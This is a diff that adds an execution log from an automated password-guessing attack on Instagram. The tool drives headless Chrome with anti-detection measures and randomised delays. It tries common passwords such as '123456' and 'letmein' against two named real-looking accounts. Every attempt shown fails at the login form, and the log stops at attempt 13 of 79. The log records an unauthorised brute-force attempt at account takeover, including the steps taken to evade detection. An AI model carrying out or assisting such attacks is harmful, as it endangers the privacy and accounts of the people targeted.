@@ -1,0 +1,861 @@
+2025-05-25 08:43:40,338 - INFO - 🔥🔥🔥 STARTING DIRECT INSTAGRAM ATTACK 🔥🔥🔥
+2025-05-25 08:43:40,338 - INFO - Loaded 2 targets
+2025-05-25 08:43:40,338 - INFO - Loaded 79 passwords
+2025-05-25 08:43:40,338 - INFO - 🎯 Targets: ['alx.trading', 'whatilove1728']
+2025-05-25 08:43:40,339 - INFO - 🔑 Passwords: 79 loaded
+2025-05-25 08:43:40,339 - INFO - 🎯 ATTACKING TARGET: alx.trading
+2025-05-25 08:43:40,339 - INFO - Attempt 1/79: 123456
+2025-05-25 08:43:40,339 - INFO - 🎯 Direct attack: alx.trading:123456
+2025-05-25 08:43:42,342 - INFO - 🖥️ Virtual display started: :84
+2025-05-25 08:43:44,343 - INFO - 🖥️ Virtual display started: :60
+2025-05-25 08:43:44,343 - INFO - Creating chrome browser session...
+2025-05-25 08:43:44,360 - INFO - ====== WebDriver manager ======
+2025-05-25 08:43:44,439 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:43:44,456 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:43:44,469 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:43:45,395 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:43:45,395 - INFO - ✅ Browser session created successfully
+2025-05-25 08:43:45,395 - INFO - Navigating to Instagram...
+2025-05-25 08:43:51,000 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:44:51,183 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:44:51,261 - INFO - ✅ Browser session closed
+2025-05-25 08:44:51,261 - INFO - ✅ Virtual display stopped
+2025-05-25 08:44:51,262 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86570>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6be14181ad4e20fcfe7a44bf092bb1a7
+2025-05-25 08:44:51,263 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86300>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6be14181ad4e20fcfe7a44bf092bb1a7
+2025-05-25 08:44:51,264 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c869c0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/6be14181ad4e20fcfe7a44bf092bb1a7
+2025-05-25 08:44:51,264 - INFO - ✅ Browser session closed
+2025-05-25 08:44:51,264 - INFO - ✅ Virtual display stopped
+2025-05-25 08:44:51,264 - INFO - Attempt 2/79: password
+2025-05-25 08:44:51,264 - INFO - Waiting 13.2s before next attempt...
+2025-05-25 08:45:04,464 - INFO - 🎯 Direct attack: alx.trading:password
+2025-05-25 08:45:06,465 - INFO - 🖥️ Virtual display started: :30
+2025-05-25 08:45:08,467 - INFO - 🖥️ Virtual display started: :94
+2025-05-25 08:45:08,467 - INFO - Creating chrome browser session...
+2025-05-25 08:45:08,467 - INFO - ====== WebDriver manager ======
+2025-05-25 08:45:08,548 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:45:08,562 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:45:08,574 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:45:08,950 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:45:08,950 - INFO - ✅ Browser session created successfully
+2025-05-25 08:45:08,950 - INFO - Navigating to Instagram...
+2025-05-25 08:45:15,374 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:46:15,563 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:46:15,639 - INFO - ✅ Browser session closed
+2025-05-25 08:46:15,639 - INFO - ✅ Virtual display stopped
+2025-05-25 08:46:15,640 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86ed0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e301c80f400da2e39d8e789e066734a8
+2025-05-25 08:46:15,641 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86a50>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e301c80f400da2e39d8e789e066734a8
+2025-05-25 08:46:15,641 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86c30>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/e301c80f400da2e39d8e789e066734a8
+2025-05-25 08:46:15,642 - INFO - ✅ Browser session closed
+2025-05-25 08:46:15,642 - INFO - ✅ Virtual display stopped
+2025-05-25 08:46:15,642 - INFO - Attempt 3/79: 123456789
+2025-05-25 08:46:15,642 - INFO - Waiting 9.3s before next attempt...
+2025-05-25 08:46:24,957 - INFO - 🎯 Direct attack: alx.trading:123456789
+2025-05-25 08:46:26,959 - INFO - 🖥️ Virtual display started: :41
+2025-05-25 08:46:28,960 - INFO - 🖥️ Virtual display started: :20
+2025-05-25 08:46:28,960 - INFO - Creating chrome browser session...
+2025-05-25 08:46:28,960 - INFO - ====== WebDriver manager ======
+2025-05-25 08:46:29,032 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:46:29,041 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:46:29,052 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:46:29,430 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:46:29,430 - INFO - ✅ Browser session created successfully
+2025-05-25 08:46:29,430 - INFO - Navigating to Instagram...
+2025-05-25 08:46:34,825 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:47:34,968 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:47:35,041 - INFO - ✅ Browser session closed
+2025-05-25 08:47:35,041 - INFO - ✅ Virtual display stopped
+2025-05-25 08:47:35,042 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86ed0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c668ccb66f879b74efd76025be934ca2
+2025-05-25 08:47:35,042 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87d70>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c668ccb66f879b74efd76025be934ca2
+2025-05-25 08:47:35,043 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86ea0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c668ccb66f879b74efd76025be934ca2
+2025-05-25 08:47:35,044 - INFO - ✅ Browser session closed
+2025-05-25 08:47:35,044 - INFO - ✅ Virtual display stopped
+2025-05-25 08:47:35,044 - INFO - Attempt 4/79: 12345678
+2025-05-25 08:47:35,044 - INFO - Waiting 7.7s before next attempt...
+2025-05-25 08:47:42,738 - INFO - 🎯 Direct attack: alx.trading:12345678
+2025-05-25 08:47:44,739 - INFO - 🖥️ Virtual display started: :30
+2025-05-25 08:47:46,740 - INFO - 🖥️ Virtual display started: :27
+2025-05-25 08:47:46,740 - INFO - Creating chrome browser session...
+2025-05-25 08:47:46,741 - INFO - ====== WebDriver manager ======
+2025-05-25 08:47:46,813 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:47:46,823 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:47:46,834 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:47:47,198 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:47:47,198 - INFO - ✅ Browser session created successfully
+2025-05-25 08:47:47,198 - INFO - Navigating to Instagram...
+2025-05-25 08:47:51,039 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:48:51,209 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:48:51,283 - INFO - ✅ Browser session closed
+2025-05-25 08:48:51,283 - INFO - ✅ Virtual display stopped
+2025-05-25 08:48:51,284 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87860>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/4823a46dbd2534772799979b9cb7ffb8
+2025-05-25 08:48:51,284 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c875f0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/4823a46dbd2534772799979b9cb7ffb8
+2025-05-25 08:48:51,285 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c874d0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/4823a46dbd2534772799979b9cb7ffb8
+2025-05-25 08:48:51,286 - INFO - ✅ Browser session closed
+2025-05-25 08:48:51,286 - INFO - ✅ Virtual display stopped
+2025-05-25 08:48:51,286 - INFO - Attempt 5/79: 12345
+2025-05-25 08:48:51,286 - INFO - Waiting 9.6s before next attempt...
+2025-05-25 08:49:00,879 - INFO - 🎯 Direct attack: alx.trading:12345
+2025-05-25 08:49:02,880 - INFO - 🖥️ Virtual display started: :41
+2025-05-25 08:49:04,881 - INFO - 🖥️ Virtual display started: :34
+2025-05-25 08:49:04,882 - INFO - Creating chrome browser session...
+2025-05-25 08:49:04,882 - INFO - ====== WebDriver manager ======
+2025-05-25 08:49:04,959 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:49:04,971 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:49:04,983 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:49:05,311 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:49:05,312 - INFO - ✅ Browser session created successfully
+2025-05-25 08:49:05,312 - INFO - Navigating to Instagram...
+2025-05-25 08:49:09,721 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:50:09,876 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:50:09,948 - INFO - ✅ Browser session closed
+2025-05-25 08:50:09,948 - INFO - ✅ Virtual display stopped
+2025-05-25 08:50:09,949 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c874a0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/8495f5751e259eee4c68bc6a3b0a24a3
+2025-05-25 08:50:09,950 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c869c0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/8495f5751e259eee4c68bc6a3b0a24a3
+2025-05-25 08:50:09,950 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86ea0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/8495f5751e259eee4c68bc6a3b0a24a3
+2025-05-25 08:50:09,951 - INFO - ✅ Browser session closed
+2025-05-25 08:50:09,951 - INFO - ✅ Virtual display stopped
+2025-05-25 08:50:09,951 - INFO - Attempt 6/79: 1234567
+2025-05-25 08:50:09,951 - INFO - Waiting 11.7s before next attempt...
+2025-05-25 08:50:21,626 - INFO - 🎯 Direct attack: alx.trading:1234567
+2025-05-25 08:50:23,627 - INFO - 🖥️ Virtual display started: :96
+2025-05-25 08:50:25,628 - INFO - 🖥️ Virtual display started: :28
+2025-05-25 08:50:25,629 - INFO - Creating chrome browser session...
+2025-05-25 08:50:25,629 - INFO - ====== WebDriver manager ======
+2025-05-25 08:50:25,702 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:50:25,713 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:50:25,724 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:50:26,075 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:50:26,075 - INFO - ✅ Browser session created successfully
+2025-05-25 08:50:26,076 - INFO - Navigating to Instagram...
+2025-05-25 08:50:29,848 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:51:30,041 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:51:30,113 - INFO - ✅ Browser session closed
+2025-05-25 08:51:30,113 - INFO - ✅ Virtual display stopped
+2025-05-25 08:51:30,114 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86570>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/30bb2cec503acc64e0ce2dca6b982a07
+2025-05-25 08:51:30,115 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87500>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/30bb2cec503acc64e0ce2dca6b982a07
+2025-05-25 08:51:30,115 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87b60>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/30bb2cec503acc64e0ce2dca6b982a07
+2025-05-25 08:51:30,116 - INFO - ✅ Browser session closed
+2025-05-25 08:51:30,116 - INFO - ✅ Virtual display stopped
+2025-05-25 08:51:30,116 - INFO - Attempt 7/79: 1234567890
+2025-05-25 08:51:30,116 - INFO - Waiting 8.4s before next attempt...
+2025-05-25 08:51:38,513 - INFO - 🎯 Direct attack: alx.trading:1234567890
+2025-05-25 08:51:40,514 - INFO - 🖥️ Virtual display started: :68
+2025-05-25 08:51:42,516 - INFO - 🖥️ Virtual display started: :54
+2025-05-25 08:51:42,516 - INFO - Creating chrome browser session...
+2025-05-25 08:51:42,516 - INFO - ====== WebDriver manager ======
+2025-05-25 08:51:42,589 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:51:42,605 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:51:42,617 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:51:42,979 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:51:42,980 - INFO - ✅ Browser session created successfully
+2025-05-25 08:51:42,980 - INFO - Navigating to Instagram...
+2025-05-25 08:51:48,954 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:52:49,181 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:52:49,289 - INFO - ✅ Browser session closed
+2025-05-25 08:52:49,290 - INFO - ✅ Virtual display stopped
+2025-05-25 08:52:49,291 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87f80>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f7fdfc857555108996234de4a7940097
+2025-05-25 08:52:49,294 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c86bd0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f7fdfc857555108996234de4a7940097
+2025-05-25 08:52:49,298 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c878f0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/f7fdfc857555108996234de4a7940097
+2025-05-25 08:52:49,299 - INFO - ✅ Browser session closed
+2025-05-25 08:52:49,300 - INFO - ✅ Virtual display stopped
+2025-05-25 08:52:49,300 - INFO - Attempt 8/79: qwerty
+2025-05-25 08:52:49,301 - INFO - Waiting 6.9s before next attempt...
+2025-05-25 08:52:56,152 - INFO - 🎯 Direct attack: alx.trading:qwerty
+2025-05-25 08:52:58,153 - INFO - 🖥️ Virtual display started: :80
+2025-05-25 08:53:00,155 - INFO - 🖥️ Virtual display started: :41
+2025-05-25 08:53:00,155 - INFO - Creating chrome browser session...
+2025-05-25 08:53:00,155 - INFO - ====== WebDriver manager ======
+2025-05-25 08:53:00,237 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:53:00,247 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:53:00,257 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:53:00,622 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:53:00,622 - INFO - ✅ Browser session created successfully
+2025-05-25 08:53:00,622 - INFO - Navigating to Instagram...
+2025-05-25 08:53:04,744 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:54:04,955 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:54:05,031 - INFO - ✅ Browser session closed
+2025-05-25 08:54:05,032 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87a40>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/add609623e33969ffb2f48a79e88f5ab
+2025-05-25 08:54:05,033 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87740>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/add609623e33969ffb2f48a79e88f5ab
+2025-05-25 08:54:05,033 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87380>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/add609623e33969ffb2f48a79e88f5ab
+2025-05-25 08:54:05,034 - INFO - ✅ Browser session closed
+2025-05-25 08:54:05,034 - INFO - Attempt 9/79: abc123
+2025-05-25 08:54:05,034 - INFO - Waiting 8.4s before next attempt...
+2025-05-25 08:54:13,474 - INFO - 🎯 Direct attack: alx.trading:abc123
+2025-05-25 08:54:15,476 - INFO - 🖥️ Virtual display started: :88
+2025-05-25 08:54:17,477 - INFO - 🖥️ Virtual display started: :50
+2025-05-25 08:54:17,477 - INFO - Creating chrome browser session...
+2025-05-25 08:54:17,478 - INFO - ====== WebDriver manager ======
+2025-05-25 08:54:17,550 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:54:17,562 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:54:17,573 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:54:17,919 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:54:17,920 - INFO - ✅ Browser session created successfully
+2025-05-25 08:54:17,920 - INFO - Navigating to Instagram...
+2025-05-25 08:54:23,233 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:55:23,461 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:55:23,535 - INFO - ✅ Browser session closed
+2025-05-25 08:55:23,535 - INFO - ✅ Virtual display stopped
+2025-05-25 08:55:23,536 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87a40>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0e61afbb2629ec182063af1c539dd52a
+2025-05-25 08:55:23,537 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87800>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0e61afbb2629ec182063af1c539dd52a
+2025-05-25 08:55:23,537 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c879b0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/0e61afbb2629ec182063af1c539dd52a
+2025-05-25 08:55:23,538 - INFO - ✅ Browser session closed
+2025-05-25 08:55:23,538 - INFO - ✅ Virtual display stopped
+2025-05-25 08:55:23,538 - INFO - Attempt 10/79: 111111
+2025-05-25 08:55:23,538 - INFO - Waiting 12.3s before next attempt...
+2025-05-25 08:55:35,827 - INFO - 🎯 Direct attack: alx.trading:111111
+2025-05-25 08:55:37,829 - INFO - 🖥️ Virtual display started: :51
+2025-05-25 08:55:39,830 - INFO - 🖥️ Virtual display started: :33
+2025-05-25 08:55:39,833 - INFO - Creating chrome browser session...
+2025-05-25 08:55:39,833 - INFO - ====== WebDriver manager ======
+2025-05-25 08:55:40,018 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:55:40,033 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:55:40,051 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:55:40,687 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:55:40,688 - INFO - ✅ Browser session created successfully
+2025-05-25 08:55:40,689 - INFO - Navigating to Instagram...
+2025-05-25 08:55:46,248 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:56:46,433 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:56:46,516 - INFO - ✅ Browser session closed
+2025-05-25 08:56:46,516 - INFO - ✅ Virtual display stopped
+2025-05-25 08:56:46,517 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87b90>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/df1493f5c49aa00576e23670edbd0a4b
+2025-05-25 08:56:46,517 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87680>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/df1493f5c49aa00576e23670edbd0a4b
+2025-05-25 08:56:46,518 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87c50>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/df1493f5c49aa00576e23670edbd0a4b
+2025-05-25 08:56:46,518 - INFO - ✅ Browser session closed
+2025-05-25 08:56:46,518 - INFO - ✅ Virtual display stopped
+2025-05-25 08:56:46,518 - INFO - Attempt 11/79: 123123
+2025-05-25 08:56:46,518 - INFO - Waiting 8.7s before next attempt...
+2025-05-25 08:56:55,178 - INFO - 🎯 Direct attack: alx.trading:123123
+2025-05-25 08:56:57,179 - INFO - 🖥️ Virtual display started: :14
+2025-05-25 08:56:59,181 - INFO - 🖥️ Virtual display started: :62
+2025-05-25 08:56:59,181 - INFO - Creating chrome browser session...
+2025-05-25 08:56:59,181 - INFO - ====== WebDriver manager ======
+2025-05-25 08:56:59,252 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:56:59,262 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:56:59,272 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:56:59,740 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:56:59,741 - INFO - ✅ Browser session created successfully
+2025-05-25 08:56:59,741 - INFO - Navigating to Instagram...
+2025-05-25 08:57:05,688 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:58:05,850 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:58:05,930 - INFO - ✅ Browser session closed
+2025-05-25 08:58:05,930 - INFO - ✅ Virtual display stopped
+2025-05-25 08:58:05,931 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87710>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/33f74281eee420ff86bdaaf9d07fbfd8
+2025-05-25 08:58:05,932 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87920>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/33f74281eee420ff86bdaaf9d07fbfd8
+2025-05-25 08:58:05,932 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0ccc710>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/33f74281eee420ff86bdaaf9d07fbfd8
+2025-05-25 08:58:05,933 - INFO - ✅ Browser session closed
+2025-05-25 08:58:05,933 - INFO - ✅ Virtual display stopped
+2025-05-25 08:58:05,933 - INFO - Attempt 12/79: admin
+2025-05-25 08:58:05,933 - INFO - Waiting 5.5s before next attempt...
+2025-05-25 08:58:11,384 - INFO - 🎯 Direct attack: alx.trading:admin
+2025-05-25 08:58:13,386 - INFO - 🖥️ Virtual display started: :40
+2025-05-25 08:58:15,387 - INFO - 🖥️ Virtual display started: :57
+2025-05-25 08:58:15,388 - INFO - Creating chrome browser session...
+2025-05-25 08:58:15,388 - INFO - ====== WebDriver manager ======
+2025-05-25 08:58:15,462 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:58:15,474 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:58:15,490 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:58:15,836 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:58:15,837 - INFO - ✅ Browser session created successfully
+2025-05-25 08:58:15,837 - INFO - Navigating to Instagram...
+2025-05-25 08:58:19,614 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 08:59:19,796 - ERROR - Attack attempt failed: Could not find username field
+2025-05-25 08:59:19,866 - INFO - ✅ Browser session closed
+2025-05-25 08:59:19,866 - INFO - ✅ Virtual display stopped
+2025-05-25 08:59:19,867 - WARNING - Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c866c0>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c15d07e4f73f694e3bad2c56bc583674
+2025-05-25 08:59:19,868 - WARNING - Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0c87440>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c15d07e4f73f694e3bad2c56bc583674
+2025-05-25 08:59:19,868 - WARNING - Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7676d0cccc50>: Failed to establish a new connection: [Errno 111] Connection refused')': /session/c15d07e4f73f694e3bad2c56bc583674
+2025-05-25 08:59:19,869 - INFO - ✅ Browser session closed
+2025-05-25 08:59:19,869 - INFO - ✅ Virtual display stopped
+2025-05-25 08:59:19,869 - INFO - Attempt 13/79: letmein
+2025-05-25 08:59:19,869 - INFO - Waiting 11.8s before next attempt...
+2025-05-25 08:59:31,642 - INFO - 🎯 Direct attack: alx.trading:letmein
+2025-05-25 08:59:33,643 - INFO - 🖥️ Virtual display started: :35
+2025-05-25 08:59:35,645 - INFO - 🖥️ Virtual display started: :97
+2025-05-25 08:59:35,645 - INFO - Creating chrome browser session...
+2025-05-25 08:59:35,645 - INFO - ====== WebDriver manager ======
+2025-05-25 08:59:35,716 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:59:35,729 - INFO - Get LATEST chromedriver version for google-chrome
+2025-05-25 08:59:35,739 - INFO - Driver [/home/codespace/.wdm/drivers/chromedriver/linux64/136.0.7103.113/chromedriver-linux64/chromedriver] found in cache
+2025-05-25 08:59:36,100 - INFO - ✅ Anti-detection measures applied
+2025-05-25 08:59:36,100 - INFO - ✅ Browser session created successfully
+2025-05-25 08:59:36,100 - INFO - Navigating to Instagram...
+2025-05-25 08:59:40,379 - INFO - Current URL: https://www.instagram.com/accounts/login/
+2025-05-25 09:00:40,549 - ERROR - Attack attempt failed: Could not find username field
